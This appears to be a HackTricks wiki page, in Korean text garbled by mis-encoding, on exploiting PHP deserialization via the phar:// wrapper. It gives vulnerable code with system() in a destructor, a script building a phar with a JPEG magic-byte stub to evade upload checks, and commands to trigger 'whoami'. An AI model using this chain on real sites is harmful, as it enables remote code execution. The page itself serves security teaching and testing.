# phar:// ì—­ì§ë ¬í™”

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì„ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**í•´í‚¹ ê²½ë ¥**ì— ê´€ì‹¬ì´ ìˆê³  í•´í‚¹í•  ìˆ˜ ì—†ëŠ” ê²ƒì„ í•´í‚¹í•˜ê³  ì‹¶ë‹¤ë©´ - **ì±„ìš© ì¤‘ì…ë‹ˆë‹¤!** (_ìœ ì°½í•œ í´ë€ë“œì–´ í•„ìˆ˜_).

{% embed url="https://www.stmcyber.com/careers" %}

**Phar** íŒŒì¼ (PHP Archive)ì€ **ì§ë ¬í™”ëœ í˜•ì‹ìœ¼ë¡œ ë©”íƒ€ ë°ì´í„°ë¥¼ í¬í•¨**í•˜ë¯€ë¡œ êµ¬ë¬¸ ë¶„ì„ë  ë•Œ ì´ **ë©”íƒ€ë°ì´í„°**ê°€ **ì—­ì§ë ¬í™”**ë˜ê³  **PHP** ì½”ë“œ ë‚´ì—ì„œ **ì—­ì§ë ¬í™” ì·¨ì•½ì **ì„ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ íŠ¹ì„±ì˜ ê°€ì¥ ì¢‹ì€ ì ì€ **file\_get\_contents(), fopen(), file() ë˜ëŠ” file\_exists(), md5\_file(), filemtime() ë˜ëŠ” filesize()**ì™€ ê°™ì´ PHP ì½”ë“œë¥¼ í‰ê°€í•˜ì§€ ì•ŠëŠ” PHP í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ë„ ì´ ì—­ì§ë ¬í™”ê°€ ë°œìƒí•œë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤.

ë”°ë¼ì„œ, **`phar://`** í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ì—¬ ì„ì˜ì˜ íŒŒì¼ì˜ í¬ê¸°ë¥¼ PHP ì›¹ì—ì„œ ê°€ì ¸ì˜¬ ìˆ˜ ìˆëŠ” ìƒí™©ì„ ìƒìƒí•´ë³´ì„¸ìš”. ê·¸ë¦¬ê³  ì½”ë“œ ë‚´ì—ì„œ ë‹¤ìŒê³¼ ìœ ì‚¬í•œ **í´ë˜ìŠ¤**ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% code title="vunl.php" %}
```php
<?php
class AnyClass {
public $data = null;
public function __construct($data) {
$this->data = $data;
}

function __destruct() {
system($this->data);
}
}

filesize("phar://test.phar"); #The attacker can control this path
```
{% endcode %}

**phar** íŒŒì¼ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ íŒŒì¼ì€ ë¡œë“œë  ë•Œ ë‹¤ìŒê³¼ ê°™ì´ **ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰**í•˜ê¸° ìœ„í•´ ì´ í´ë˜ìŠ¤ë¥¼ **ì•…ìš©**í•  ê²ƒì…ë‹ˆë‹¤:

{% code title="create_phar.php" %}
```php
<?php

class AnyClass {
public $data = null;
public function __construct($data) {
$this->data = $data;
}

function __destruct() {
system($this->data);
}
}

// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
```
{% endcode %}

**ê°€ëŠ¥í•œ** íŒŒì¼ ì—…ë¡œë“œ **ì œí•œ**ì„ **ìš°íšŒ**í•˜ê¸° ìœ„í•´ phar íŒŒì¼ì˜ **ë§ˆë²• ë°”ì´íŠ¸** (`\xff\xd8\xff`)ê°€ íŒŒì¼ì˜ ì‹œì‘ì— ì¶”ê°€ë˜ì—ˆìŒì— ì£¼ëª©í•˜ì‹­ì‹œì˜¤.\
`test.phar` íŒŒì¼ì„ ë‹¤ìŒê³¼ ê°™ì´ **ì»´íŒŒì¼**í•˜ì‹­ì‹œì˜¤:
```bash
php --define phar.readonly=0 create_phar.php
```
ê·¸ë¦¬ê³  ì·¨ì•½í•œ ì½”ë“œë¥¼ ì•…ìš©í•˜ì—¬ `whoami` ëª…ë ¹ì„ ì‹¤í–‰í•˜ì„¸ìš”:
```bash
php vuln.php
```
### ì°¸ê³  ìë£Œ

{% embed url="https://blog.ripstech.com/2018/new-php-exploitation-technique/" %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

ë§Œì•½ **í•´í‚¹ ê²½ë ¥**ì— ê´€ì‹¬ì´ ìˆê³  í•´í‚¹í•  ìˆ˜ ì—†ëŠ” ê²ƒì„ í•´í‚¹í•˜ê³  ì‹¶ë‹¤ë©´ - **ìš°ë¦¬ëŠ” ê³ ìš© ì¤‘ì…ë‹ˆë‹¤!** (_ìœ ì°½í•œ í´ë€ë“œì–´ ì‘ë¬¸ ë° êµ¬ì‚¬ ëŠ¥ë ¥ í•„ìš”_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
